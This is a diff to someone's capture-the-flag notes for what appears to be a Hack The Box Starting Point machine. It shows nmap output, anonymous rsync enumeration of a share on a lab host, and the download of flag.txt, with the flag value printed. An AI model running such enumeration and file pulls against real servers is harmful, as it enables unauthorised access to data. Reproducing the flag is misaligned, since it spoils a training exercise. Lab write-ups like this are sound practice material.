@@ -17,3 +17,16 @@ PORT     STATE    SERVICE   VERSION
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
+
+$ rsync --list-only 10.129.45.128::
+public         	Anonymous Share
+
+$ rsync --list-only 10.129.45.128::public
+drwxr-xr-x          4,096 2022/10/24 22:02:23 .
+-rw-r--r--             33 2022/10/24 21:32:03 flag.txt
+
+$ rsync 10.129.45.128::public/flag.txt flat.txt
+abc@cd1d95f54ad3:~/BlueGh05t/CTF/HTB/starting_point/synced$ exa
+flat.txt  nmap  readme.md
+abc@cd1d95f54ad3:~/BlueGh05t/CTF/HTB/starting_point/synced$ cat flat.txt 
+72eaf5344ebb84908ae543a719830519
